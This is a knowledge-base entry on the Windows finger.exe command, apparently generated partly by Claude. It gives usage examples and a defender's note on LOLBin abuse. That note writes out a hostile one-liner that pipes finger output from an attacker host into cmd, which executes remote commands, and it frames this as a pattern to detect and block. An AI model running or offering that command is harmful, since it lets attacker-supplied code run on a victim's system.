---
created: 2026-11-21
fullpath: 'c:\windows\system32\finger.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - lolbin
aliases:
  - finger.exe
  - finger
url:
  - https://learn.microsoft.com/windows-server/administration/windows-commands/finger
---

**fullpath**:c:\windows\system32\finger.exe

# description

`finger` displays information about users on a remote computer (typically a UNIX system) that runs the finger service or daemon; the remote computer decides the output format. It is a built-in Windows command, available only when TCP/IP is installed on a network adapter. Used without parameters it displays help.

## simple description

> ### 2026-11-21 Claude said
> `finger.exe` is an old network tool that asks a remote server "who is logged on?" using the Finger protocol on TCP port 79. It prints whatever text the server sends back. Almost nobody uses it legitimately today, and Finger servers are rare.
>
> **SOC NOTE**: Abused as a LOLBin to download data or commands (T1105): `finger user@attacker-host | cmd` pulls text from an attacker server, a technique seen in ClickFix-style campaigns. Any execution, outbound TCP/79 traffic, or finger output piped into `cmd`/`powershell` should be treated as suspicious. Many organisations block it with AppLocker/WDAC.
>

# purpose

Query a remote finger service for information about one user or all users on that host.

# typical use cases

| usage | description |
| --- | --- |
| `finger user1@users.microsoft.com` | Display information for user1 on the computer users.microsoft.com. |
| `finger @users.microsoft.com` | Display information for all users on users.microsoft.com. |

# options

| option | description |
| --- | --- |
| `-l` | Displays user information in long list format. |
| `<user>` | The user to get information about; if omitted, all users on the host are shown. |
| `@<host>` | The remote computer running the finger service (name or IP address). Multiple `user@host` values can be given. |
| `/?` | Displays help at the command prompt. |
